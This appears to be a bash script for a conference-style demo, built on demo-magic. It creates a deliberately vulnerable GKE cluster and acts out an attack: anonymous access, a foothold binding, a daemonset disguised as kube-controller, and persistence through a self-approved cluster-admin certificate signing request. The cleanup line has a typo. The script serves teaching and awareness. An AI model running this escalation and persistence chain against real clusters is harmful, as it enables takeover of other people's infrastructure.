#!/bin/bash

set -o errexit
set -o nounset
set -o pipefail

### Setup ###

export VULN_CLUSTER_NAME="vuln-cluster"
export VULN_CLUSTER_VERSION="1.27.3-gke.100"

DEMOMAGIC="demo-magic.sh"

if [ ! -f $DEMOMAGIC ]; then
  curl -OsS -L https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
  chmod a+x demo-magic.sh
fi

. ./demo-magic.sh
TYPE_SPEED=20
#DEMO_PROMPT="compromised_node# "
# Turns out the white defined in demo-magic renders a little grey.
DEMO_CMD_COLOR=$BOLD
clear
echo ""
echo ""

EXIST=$(gcloud container clusters list --format json | jq -r '.[] | select(.name == "vuln-cluster") | .name')
if [ "$EXIST" != "vuln-cluster" ];
then
    echo "creating cluster"
    gcloud container clusters create \
    --cluster-version $VULN_CLUSTER_VERSION \
    $VULN_CLUSTER_NAME
    echo "cluster creation finished"
fi

gcloud container clusters get-credentials $VULN_CLUSTER_NAME &> /dev/null

### DEMO ###

clear

echo ""
echo ""

DEMO_PROMPT="vuln-cluster $ "

pe "cat customer_binding.yaml"

echo ""
echo ""

pe "kubectl apply -f customer_binding.yaml"

echo ""
echo ""

pe "clear"

echo ""
echo ""

DEMO_PROMPT="attacker-machine $ "

p "scan_vulnerable_clusters.py"

echo "scanning..."
sleep 1
echo "scanning..."
sleep 1
echo "scanning..."
sleep 1
echo "target found!"

wait

clear

echo ""
echo ""

pe "cat attacker_foothold_binding.yaml"

echo ""
echo ""

pe "kubectl apply -f attacker_foothold_binding.yaml"

echo ""
echo ""

pe clear

echo ""
echo ""

p "cat attacker_foothold_daemonset.yaml"

cat attacker_foothold_daemonset_for_show.yaml

echo ""
echo ""

pe "kubectl apply -f attacker_foothold_daemonset.yaml"

echo ""
echo ""

pe "clear"

echo ""
echo ""

DEMO_PROMPT="kube-controller-daemonset $ "

openssl genrsa -out csr.key 2048

openssl req -new -key csr.key -out csr.csr -subj "/CN=cluster-admin"

ENCODED=$(cat csr.csr | base64 | tr -d "\n")

sed -e "s/{{request}}/$ENCODED/g" attacker_persistence_csr.tmpl > attacker_persistence_csr.yaml

pe "cat attacker_persistence_csr.yaml"

echo ""
echo ""

pe "clear"

echo ""
echo ""

pe "cat attacker_persistence_csr.yaml | yq -r .spec.request | base64 -d | openssl req -subject -noout"

echo ""
echo ""

pe "kubectl apply -f attacker_persistence_csr.yaml"

echo ""
echo ""

sleep 5

pe "kubectl certificate approve cluster-admin"

echo ""
echo ""

sleep 5

pe "kubectl get csr cluster-admin"

kubectl get csr cluster-admin -o jsonpath='{.status.certificate}' | base64 -d > csr.crt

echo ""
echo ""

pe "kubectl delete csr cluster-admin"

echo ""
echo ""

pe "clear"

echo ""
echo ""

pe "cat attacker_persistence_binding.yaml"

echo ""
echo ""

pe "kubectl apply -f attacker_persistence_binding.yaml"

echo ""
echo ""

pe "clear"

echo ""
echo ""

DEMO_PROMPT="attacker-machine $ "

pe "kubectl auth can-i --list --client-key csr.key --client-certificate csr.crt"

echo ""
echo ""

pe "clear"

wait

### Cleanup ###

rm csr.key csr.crt csr.csr attacker_persistence_csr.yaml
kubectl delete clusterrolebinding cluster-system-anonymous
kubectl delete clusterrolebinding kube-controller-manager
kubectl delete clusterrolebinding kube-controller-admin
kubectl delete daemonset kube-controller -n kube-system
gcloud contianer clusters delete vuln-cluster
